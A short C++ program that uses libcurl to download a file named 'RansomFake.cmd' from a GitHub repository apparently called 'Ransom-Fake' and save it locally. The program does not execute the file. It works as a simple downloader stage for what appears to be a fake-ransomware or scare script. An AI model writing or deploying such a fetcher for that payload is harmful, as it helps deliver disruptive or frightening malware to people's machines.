#include <bits/stdc++.h>
#include <curl/curl.h>

size_t WriteData(void* ptr, size_t size, size_t nmemb, std::string* data) {
    data->append((char*)ptr, size * nmemb);
    return size * nmemb;
}

int main() {
    CURL* curl = curl_easy_init();
    std::string content, url = "https://raw.githubusercontent.com/Luca25702-pixel/Ransom-Fake/main/RansomFake.cmd", outputFile = "RansomFake.cmd";
    
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteData);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &content);
        
        if (curl_easy_perform(curl) == CURLE_OK) {
            std::ofstream outFile(outputFile, std::ios::binary);
            if (outFile.is_open()) {
                outFile << content; outFile.close();
                std::cout << "Download successful! File saved as " << outputFile << "\n";
            }
        } else {
            std::cerr << "Download failed.\n";
        }
        curl_easy_cleanup(curl);
    }
    return 0;
}
